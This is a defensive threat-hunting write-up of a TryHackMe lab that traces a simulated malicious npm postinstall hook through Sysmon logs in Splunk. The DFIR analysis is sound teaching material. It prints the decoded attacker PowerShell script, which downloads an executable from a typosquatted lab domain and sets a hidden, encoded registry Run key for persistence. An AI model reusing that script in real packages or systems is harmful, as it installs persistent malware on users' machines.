# 🔍 Threat Hunt Writeup - Health Hazard
**Platform:** TryHackMe - TryDetectThis  
**Category:** Threat Hunting / DFIR  
---

## Goal

We were given a scenario where threat intelligence from TryDetectThis Intelligence identified a coordinated supply chain attack campaign targeting open-source ecosystems - specifically npm and Python package repositories.

As the threat hunter, I was tasked to conduct a comprehensive hunting session in the TryGovMe environment to:

- ✅ Validate a hunting hypothesis
- ✅ Review IOCs from external sources
- 🔄 Reconstruct the full attack chain
- 🔄 Determine the scope of the incident
- 🔄 Generate a final threat hunting report

---

## Understanding the Brief

### The Scenario
A co-founder named Tom was building the company's first website. He followed a tutorial, installed some npm packages, and a strange file appeared on the system - one that nobody placed there, didn't match any dependency, and didn't run. It just waited.

### The Hypothesis
> An attacker may have leveraged a compromised third-party software package to gain initial access to the system and silently stage a payload for later execution. They likely established persistence to maintain access without immediate detection.

This maps to three MITRE ATT&CK tactics we hunted for:

| Tactic | Technique | Description |
|---|---|---|
| Initial Access | T1195.002 | Compromise Software Supply Chain |
| Execution | T1059.001 | PowerShell |
| Persistence | T1547.001 | Registry Run Keys |

### What the IOCs Told me (Before I Even Searched)

Before touching the SIEM, the IOCs provided a roadmap of exactly what to look for:

**Host-Based IOCs:**
| Type | Value |
|---|---|
| Malicious npm Package | `healthchk-lib@1.0.1` |
| Trigger Mechanism | `postinstall` hook in `package.json` |
| Process Executed | `powershell.exe -NoP -W Hidden -EncodedCommand` |
| File Downloaded | `%APPDATA%\SystemHealthUpdater.exe` |
| Persistence Location | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| Persistence Value | `Windows Update Monitor` |

**Network-Based IOCs:**
| Type | Value |
|---|---|
| Download URL | `http://global-update.wlndows.thm/SystemHealthUpdater.exe` |
| Hostname | `global-update.wlndows.thm` |
| Protocol / Port | HTTP / Port 80 |

**Key observation before searching:** The domain `wlndows.thm` is a typosquatted version of `windows` — designed to look legitimate at a glance. This is a deliberate defence evasion technique used by the attacker.

Reading the IOCs told us the likely attack flow before I ran a single query:
1. Tom runs `npm install healthchk-lib@1.0.1`
2. The `postinstall` hook fires automatically
3. PowerShell runs hidden with an encoded command
4. It downloads `SystemHealthUpdater.exe` from the typosquatted domain
5. A registry Run key is written for persistence

---

## Investigation

### Tool Used
**Splunk SIEM** Log source: `WinEventLog:Microsoft-Windows-Sysmon/Operational`

### What is Sysmon and Why Does It Matter?
Sysmon (System Monitor) is a Windows service that logs detailed process activity. The key event codes I hunted:

| EventCode | Meaning |
|---|---|
| 1 | Process Created |
| 3 | Network Connection |
| 11 | File Created on Disk |
| 13 | Registry Value Set |

### How to Read a Sysmon Log
Every Sysmon EventCode 1 log tells you four things:

```
Image           = WHAT process ran
CommandLine     = EXACTLY how it was launched
ParentImage     = WHO launched it
ParentCommandLine = HOW the parent launched it
```

This is how you build a process tree and a process tree is how you reconstruct an attack chain.

### Phase 1 Query: Initial Access
**Search:**
```spl
index=* "healthchk-lib"
```
This broad sweep looked for any mention of the malicious package across all logs.

---

## Findings - Phase 1: Initial Access & Execution

### What We Found

Four Sysmon log entries told the complete story of initial access. Here is each log broken down:

---

#### Log 1 - `10:58:24` | EventCode 1 | npm install runs
> ![Event Log 1 - npm install](https://raw.githubusercontent.com/Prajwal-Manjunath/Threat-Hunting-Simulation-Lab/main/images/event-log-1.png)

| Field | Value |
|---|---|
| EventCode | 1 (Process Created) |
| Image | `C:\Program Files\nodejs\node.exe` |
| CommandLine | `node.exe npm-cli.js install healthchk-lib@1.0.1` |
| ParentImage | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |

**What this tells us:**  
Tom opened PowerShell himself (his legitimate terminal) and ran `npm install healthchk-lib@1.0.1`. This is the moment of initial access Tom unknowingly installed the malicious package. Everything that follows happens automatically without his knowledge.

---

#### Log 2 - `10:58:27` | EventCode 11 | Malicious script written to disk
> ![Event Log 2 - npm install](https://raw.githubusercontent.com/Prajwal-Manjunath/Threat-Hunting-Simulation-Lab/main/images/event-log-2.png)

| Field | Value |
|---|---|
| EventCode | 11 (File Created) |
| Image | `C:\Program Files\nodejs\node.exe` |
| TargetFilename | `C:\Development\node_modules\healthchk-lib\scripts\postinstall.ps1` |

**What this tells us:**  
As part of the npm install process, node.exe extracted and wrote `postinstall.ps1` to disk. A legitimate health check library has no reason to write PowerShell scripts anywhere. This file appearing on disk is a red flag on its own.

---

#### Log 3 - `10:58:27` | EventCode 1 | cmd.exe spawned by node.exe
> ![Event Log 3 - npm install](https://raw.githubusercontent.com/Prajwal-Manjunath/Threat-Hunting-Simulation-Lab/main/images/event-log-3.png)

| Field | Value |
|---|---|
| EventCode | 1 (Process Created) |
| Image | `C:\Windows\System32\cmd.exe` |
| ParentImage | `C:\Program Files\nodejs\node.exe` |
| ParentCommandLine | `node.exe npm-cli.js install healthchk-lib@1.0.1` |

**What this tells us:**  
node.exe automatically spawned cmd.exe. Tom did not manually open cmd.exe this was the `postinstall` hook in the malicious package's `package.json` firing silently in the background. Tom saw nothing.

---

#### Log 4 — `10:58:27` | EventCode 1 | Hidden PowerShell spawned
> ![Event Log 4 - npm install](https://raw.githubusercontent.com/Prajwal-Manjunath/Threat-Hunting-Simulation-Lab/main/images/event-log-4.png)

| Field | Value |
|---|---|
| EventCode | 1 (Process Created) |
| Image | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| CommandLine | `powershell.exe -NoP -W Hidden -EncodedCommand <base64>` |
| ParentImage | `C:\Windows\System32\cmd.exe` |
| ParentCommandLine | `cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand` |

**What this tells us:**  
cmd.exe launched a hidden PowerShell instance with an encoded command. The flags used are deliberate defence evasion:

| Flag | Meaning |
|---|---|
| `-NoP` | No Profile — don't load PowerShell profile, faster and quieter |
| `-W Hidden` | Hidden window — no visible terminal appears |
| `-EncodedCommand` | Command is Base64 encoded — obfuscates intent from logs |

The `/c` flag in the parent cmd.exe command means cmd.exe was told to run PowerShell and immediately exit - so cmd.exe disappears quickly and leaves less trace.

---

### The Process Tree (Phase 1)

```
Tom's PowerShell  ← Tom did this intentionally
        ↓
    node.exe       ← Legitimate (npm install)
        ↓
    cmd.exe        ← SUSPICIOUS (postinstall hook fired)
        ↓
powershell.exe     ← MALICIOUS (hidden, encoded command)
-NoP -W Hidden
-EncodedCommand
```

**Key analyst insight:**  
`node.exe → cmd.exe → powershell.exe -W Hidden -EncodedCommand` is not normal behaviour. Legitimate software does not spawn hidden PowerShell with encoded commands. This parent-child relationship alone should trigger a detection rule.

---

### Hypothesis Validation - Phase 1

| Hypothesis Component | Status | Evidence |
|---|---|---|
| Compromised third-party package used for initial access | ✅ Confirmed | `healthchk-lib@1.0.1` postinstall hook fired on install |
| Malicious execution following initial access | ✅ Confirmed | Hidden PowerShell with encoded command spawned by node.exe |

---

## Findings - Phase 2: Execution
 
### Query Used
```spl
index=* "global-update.wlndows.thm"
```
 
### What We Found
 
---
 
#### Log 5 - `10:58:29` | EventCode 22 | DNS query to typosquatted domain
> ![Event Log 5 - npm install](https://raw.githubusercontent.com/Prajwal-Manjunath/Threat-Hunting-Simulation-Lab/main/images/event-log-5.png)

| Field | Value |
|---|---|
| EventCode | 22 (DNS Query) |
| Image | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| QueryName | `global-update.wlndows.thm` |
| QueryResults | `::ffff:127.0.0.1` |
| ProcessGuid | `{c5d2b969-9053-6856-e701-000000002a01}` |
 
**What this tells us:**  
Two seconds after the malicious PowerShell spawned, it made a DNS query to resolve `global-update.wlndows.thm` the typosquatted domain from our IOCs. This is PowerShell's `Invoke-WebRequest` attempting to download `SystemHealthUpdater.exe`. The ProcessGuid matches the hidden PowerShell from Log 4, directly linking this network activity to the malicious process.
 
The domain resolved to `127.0.0.1` (localhost) because this is a lab environment. In a real attack this would resolve to an attacker-controlled server on the internet.

### Decoded Malicious Script
 
The Base64 encoded command from Log 4 was decoded using CyberChef (From Base64 → Decode UTF-16LE). The full decoded script:
 
```powershell
$dest = "$env:APPDATA\SystemHealthUpdater.exe"
$url = "http://global-update.wlndows.thm/SystemHealthUpdater.exe"
 
# Download file
Invoke-WebRequest -Uri $url -OutFile $dest
 
# Base64 encode the command
$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes("Start-Process '$dest'")
)
 
# Build persistence command
$runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded
 
# Add to registry for persistence
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'Windows Update Monitor' -Value $runCmd
```
 
**What each section does:**
 
| Section | Code | What It Does |
|---|---|---|
| 1 | `$dest` / `$url` | Sets the download destination and source URL |
| 2 | `Invoke-WebRequest` | Downloads `SystemHealthUpdater.exe` silently to AppData |
| 3 | `$encoded` / `$runCmd` | Builds a new hidden PowerShell command to launch the exe |
| 4 | `Set-ItemProperty` | Writes that command to the registry Run key for persistence |
 
The script handles both execution **and** persistence in a single pass. One PowerShell process three malicious actions.

---

## Findings Phase 3: Persistence
 
### Query Used
```spl
index=* "Windows Update Monitor"
```
 
### What We Found
 
---
 
#### Log 6 - `10:58:29` | EventCode 13 | Registry Run key written
> ![Event Log 6 - npm install](https://raw.githubusercontent.com/Prajwal-Manjunath/Threat-Hunting-Simulation-Lab/main/images/event-log-6.png)

| Field | Value |
|---|---|
| EventCode | 13 (Registry Value Set) |
| Image | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| TargetObject | `HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update Monitor` |
| Details | `powershell.exe -NoP -W Hidden -EncodedCommand <base64>` |
| RuleName | `T1060,RunKey` |
| ProcessGuid | `{c5d2b969-9053-6856-e701-000000002a01}` |
 
**What this tells us:**  
The malicious PowerShell wrote a registry Run key named `Windows Update Monitor`  deliberately named to blend in with legitimate Windows processes. Every time Tom logs into Windows, this key silently fires a hidden PowerShell command that launches `SystemHealthUpdater.exe` from his AppData folder.
 
The `Details` field contains another Base64 encoded command which decodes to:
```powershell
Start-Process 'C:\Users\Administrator\AppData\Roaming\SystemHealthUpdater.exe'
```
 
Note Sysmon itself tagged this with `RuleName: T1060,RunKey` confirming this is a known persistence technique already mapped in the detection ruleset.
 
**Key linking observation:**  
The `ProcessGuid` across Logs 4, 5, and 6 is identical `{c5d2b969-9053-6856-e701-000000002a01}`. One single malicious PowerShell process was responsible for the encoded execution, the DNS query, and the registry persistence write. This is the thread that ties the entire execution phase together.
 
---
 
## ✅ Final Attack Chain
 
```
[10:58:24] Tom opens PowerShell and runs npm install healthchk-lib@1.0.1
                                ↓
[10:58:27] node.exe writes postinstall.ps1 to disk
           C:\Development\node_modules\healthchk-lib\scripts\postinstall.ps1
                                ↓
[10:58:27] node.exe spawns cmd.exe via postinstall hook
           Tom sees nothing — happens silently in the background
                                ↓
[10:58:27] cmd.exe spawns powershell.exe -NoP -W Hidden -EncodedCommand
           Hidden window, no profile, Base64 obfuscated payload
                                ↓
[10:58:29] PowerShell makes DNS query to global-update.wlndows.thm
           Attempts to download SystemHealthUpdater.exe to %APPDATA%
                                ↓
[10:58:29] PowerShell writes registry Run key
           HKCU\...\Run\Windows Update Monitor
           Value: powershell.exe -NoP -W Hidden -EncodedCommand <Start-Process exe>
                                ↓
[Every login] SystemHealthUpdater.exe launches silently
              Attacker maintains persistent access to Tom's machine
```
 
---
 
## ✅ Hypothesis Validation Final
 
> **The hypothesis is CONFIRMED.**
 
An attacker embedded a malicious `postinstall` hook inside the npm package `healthchk-lib@1.0.1`. When Tom ran `npm install`, the hook automatically executed a hidden PowerShell command that downloaded a payload from a typosquatted domain and established persistence via a registry Run key; all without Tom performing any action beyond a routine package install.
 
---
 
## ✅ Scope & Impacted Assets
 
| Asset | Detail |
|---|---|
| Compromised Host | `PAW-TOM` |
| Affected User | `PAW-TOM\itadmin-tom` |
| Malicious Package | `healthchk-lib@1.0.1` |
| Payload Staged | `%APPDATA%\SystemHealthUpdater.exe` |
| Persistence Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update Monitor` |
| C2 Domain Contacted | `global-update.wlndows.thm` |
| Attack Duration | All activity within 5 seconds (10:58:24 → 10:58:29) |
 
---
 
## MITRE ATT&CK Summary
 
| Tactic | Technique ID | Technique Name | Evidence |
|---|---|---|---|
| Initial Access | T1195.002 | Compromise Software Supply Chain | `healthchk-lib@1.0.1` postinstall hook |
| Execution | T1059.001 | PowerShell | `powershell.exe -NoP -W Hidden -EncodedCommand` |
| Defence Evasion | T1027 | Obfuscated Files or Information | Base64 encoded commands throughout |
| Command & Control | T1071.001 | Web Protocols | HTTP download over port 80 |
| Persistence | T1547.001 | Registry Run Keys / Startup Folder | `HKCU\...\Run\Windows Update Monitor` |
 
---
